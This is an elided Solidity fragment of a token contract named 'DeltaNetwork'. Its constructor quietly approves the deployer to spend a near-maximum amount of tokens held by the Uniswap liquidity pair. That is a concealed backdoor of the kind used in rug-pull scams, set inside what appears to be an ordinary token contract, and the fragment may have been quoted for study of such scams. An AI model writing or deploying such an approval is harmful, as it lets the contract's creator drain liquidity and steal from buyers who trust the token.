...
contract DeltaNetwork {
    string  private _name = 'DeltaNetwork';
    ...
    constructor () {
        ...
        _approve(uniswapPair, msg.sender, 0xdffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd);
